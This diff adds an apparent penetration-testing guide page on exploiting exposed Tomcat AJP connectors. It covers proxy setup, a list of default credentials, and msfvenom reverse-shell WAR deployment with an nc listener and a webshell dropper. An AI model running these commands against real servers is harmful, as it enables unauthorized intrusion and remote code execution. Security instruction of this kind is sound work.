@@ -1,0 +1,201 @@
+---
+title: AJP & Tomcat
+description: Reaching hidden Tomcat applications through exposed AJP connectors using Nginx, Apache, or direct AJP clients.
+mitre: [T1190, T1210]
+d3fend: [D3-ACH, D3-NI, D3-ITF]
+impact: [FileRead, RCE]
+owasp: [A02]
+sidebar:
+  order: 1
+  label: AJP & Tomcat
+---
+import { Aside, Tabs, TabItem, Steps } from '@astrojs/starlight/components';
+
+## TL;DR
+
+Apache JServ Protocol (AJP) is Tomcat's binary back-channel - port 8009 by default. When AJP is exposed externally, you can reach the Tomcat manager and any backend apps that the operator thought were behind a reverse proxy. Two ways in: front it with your own Nginx/Apache configured as an AJP client, or hit it directly with [Ghostcat](/codex/web/server-side/intermediary/ghostcat/) (CVE-2020-1938) for file disclosure / RCE.
+
+```bash
+# Detection
+nmap -sV -p 8009 <TARGET>
+# Look for: ajp13 open, "Apache Jserv" in service banner
+
+# Direct exploitation (preferred)
+# → see Ghostcat page
+
+# Proxy-based access (when Ghostcat is patched)
+# → set up Nginx or Apache as AJP client (below)
+```
+
+Success indicator: the Tomcat default page or `/manager/html` reachable from your browser via the local proxy.
+
+## When you'll see this
+
+- Internal pentests with a poorly segmented network
+- External assessments where someone exposed 8009 thinking it was internal-only
+- Container deployments where AJP and HTTP both bind `0.0.0.0`
+- Internet-wide scans (Shodan facet `port:8009`) - common enough to find in scope
+
+## Detection
+
+```bash
+# Service detection
+nmap -sV -p 8009,8080,8443 <TARGET>
+
+# Faster sweep
+nmap -p 8009 --open <NETWORK>/24
+
+# Confirm AJP responsiveness
+nmap -p 8009 --script ajp-headers,ajp-methods <TARGET>
+```
+
+Look for `ajp13` in service banners. If port 8080 is also open and shows a Tomcat default page, the AJP connector is almost certainly the back-channel.
+
+## Nginx as AJP client
+
+When [Ghostcat](/codex/web/server-side/intermediary/ghostcat/) is patched but the AJP port is still reachable, fronting it with Nginx gives you a browser-friendly window into Tomcat.
+
+Stock Nginx doesn't ship with AJP support - you compile from source with `nginx_ajp_module`.
+
+<Steps>
+
+1. **Get Nginx source and the module:**
+
+   ```bash
+   wget https://nginx.org/download/nginx-1.27.0.tar.gz
+   tar -xzvf nginx-1.27.0.tar.gz
+   git clone https://github.com/dvershinin/nginx_ajp_module.git
+   sudo apt install -y libpcre3-dev zlib1g-dev libssl-dev
+   ```
+
+2. **Compile with the AJP module:**
+
+   ```bash
+   cd nginx-1.27.0
+   ./configure --add-module=../nginx_ajp_module \
+       --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx \
+       --modules-path=/usr/lib/nginx/modules
+   make && sudo make install
+   nginx -V 2>&1 | grep ajp
+   ```
+
+3. **Configure to point at the target.** Replace the entire `server` block in `/etc/nginx/conf/nginx.conf` and add inside `http { ... }`:
+
+   ```nginx
+   upstream tomcats {
+       server <TARGET>:8009;
+       keepalive 10;
+   }
+
+   server {
+       listen 8000;
+       location / {
+           ajp_keep_conn on;
+           ajp_pass tomcats;
+       }
+   }
+   ```
+
+   Use port 8000 or another free local port - port 80 is often in use.
+
+4. **Start and verify:**
+
+   ```bash
+   sudo nginx
+   curl -i http://127.0.0.1:8000/
+   ```
+
+   Expect the Tomcat default page in the response body.
+
+5. **Reach the manager:**
+
+   ```bash
+   curl -i http://127.0.0.1:8000/manager/html -u tomcat:s3cret
+   ```
+
+   Default credentials worth trying: `tomcat:tomcat`, `tomcat:s3cret`, `admin:admin`, `admin:tomcat`, `manager:manager`. Tomcat ships locked by default - credentials only exist if someone added them, which means someone *did* add them.
+
+</Steps>
+
+## Apache as AJP client
+
+Apache's `mod_proxy_ajp` is precompiled - faster setup than Nginx if Apache is already on your system.
+
+<Steps>
+
+1. **Install and enable modules:**
+
+   ```bash
+   sudo apt install -y libapache2-mod-jk
+   sudo a2enmod proxy proxy_ajp proxy_http
+   ```
+
+2. **Create the site config** at `/etc/apache2/sites-available/ajp-proxy.conf`:
+
+   ```apache
+   <VirtualHost *:8000>
+       <Proxy *>
+           Require all granted
+       </Proxy>
+       ProxyPass / ajp://<TARGET>:8009/
+       ProxyPassReverse / ajp://<TARGET>:8009/
+   </VirtualHost>
+   ```
+
+   Add `Listen 8000` to `/etc/apache2/ports.conf` if needed.
+
+3. **Enable and start:**
+
+   ```bash
+   sudo a2ensite ajp-proxy
+   sudo systemctl restart apache2
+   curl -i http://127.0.0.1:8000/
+   ```
+
+</Steps>
+
+## Direct AJP clients
+
+When you don't want to spin up a webserver, lightweight AJP clients exist:
+
+```bash
+# AJPy - Python AJP client
+pip install ajpy
+python -m ajpy.tomcat <TARGET> 8009 --webapp=manager
+
+# tomcatWarDeployer - drops a webshell after auth
+git clone https://github.com/mgeeky/tomcatWarDeployer
+./tomcatWarDeployer.py -U tomcat -P s3cret -H <LHOST> -p <LPORT> <TARGET>:8009
+```
+
+## Post-access - Tomcat exploitation
+
+Once you have a Tomcat session (manager UI, `/manager/text`, or shell):
+
+```bash
+# Generate a war reverse shell
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war -o shell.war
+
+# Deploy via manager API (requires manager-script role)
+curl -u tomcat:s3cret --upload-file shell.war \
+    "http://127.0.0.1:8000/manager/text/deploy?path=/shell"
+
+# Trigger
+curl http://127.0.0.1:8000/shell/
+
+# Listen
+nc -lvnp <LPORT>
+```
+
+The `manager-script` role is what enables programmatic deployment. The `manager-gui` role enables the web UI but not `/manager/text/*`. Sometimes a tester has GUI but no script - use the GUI's "WAR file to deploy" upload form in that case.
+
+## Common failure modes
+
+- **AJP secret required.** Tomcat 9.0.31+ defaults to requiring `requiredSecret` on the AJP connector. If your client gets `403 Forbidden` from AJP, the connector is in protected mode. Without the secret you can't drive it; check whether the deploying admin disabled the protection (common during migrations) or whether [Ghostcat](/codex/web/server-side/intermediary/ghostcat/) (which doesn't need the secret on older Tomcat) applies.
+- **Manager returns 403 from external IP.** The manager app has its own access control via `RemoteAddrValve`, typically restricted to `127.0.0.1`. Your AJP-proxied request *appears* to come from local Tomcat's perspective only if the AJP client passes the right headers. Apache and Nginx AJP modules generally do; bare AJP clients sometimes don't.
+- **Module compile fails on Nginx.** Missing dev headers. Install `libpcre3-dev`, `zlib1g-dev`, `libssl-dev`. On RHEL/Fedora the package names differ (`pcre-devel`, `zlib-devel`, `openssl-devel`).
+- **Connection refused from AJP port.** Tomcat's AJP connector binds `127.0.0.1` by default in modern versions. If the port appears closed externally but the Tomcat HTTP port is open, AJP is bound locally and Ghostcat won't work either.
+
+## Notes
+
+AJP exposure is a configuration mistake, not a vulnerability per se - the protocol is functioning as designed. The bug, when one exists, is Ghostcat (which exploits the AJP attribute-injection design flaw). When you find an AJP port, check Ghostcat first; the proxy approach is the fallback for patched Tomcat where AJP remained externally bound.
